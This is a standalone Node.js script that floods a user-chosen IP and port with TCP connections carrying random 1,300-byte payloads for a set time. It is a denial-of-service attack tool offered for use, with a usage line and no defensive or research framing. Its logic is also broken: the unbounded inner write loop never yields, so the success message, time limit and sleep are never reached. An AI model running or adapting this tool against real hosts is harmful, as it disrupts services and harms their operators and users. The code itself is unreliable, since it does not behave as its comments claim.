const net = require('net');
const crypto = require('crypto');

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
  if (process.argv.length !== 5) {
    console.log("Usage: node filename.js <IP> <port> <time>");
    return;
  }

  const ip = process.argv[2];
  const port = parseInt(process.argv[3]);
  const timeInSeconds = parseInt(process.argv[4]); // Time in seconds

  const endTime = Date.now() + (timeInSeconds * 1000); // Convert time to milliseconds

  while (Date.now() < endTime) {
    try {
      // Establish TCP connection
      const client = new net.Socket();
      await new Promise((resolve, reject) => {
        client.connect(port, ip, resolve);
        client.on('error', reject);
      });

      // Generate random data
      const data = Buffer.alloc(1300);
      crypto.randomFillSync(data);

      // Send data continuously without waiting for a response
      while (true) {
        client.write(data, null, () => {});
      }

      console.log("Data sent successfully!");
    } catch (err) {
      console.log(`Failed to connect or send data: ${err}`);
    }

    await sleep(5000); // Wait for 5 seconds before sending the next packet
  }
})();
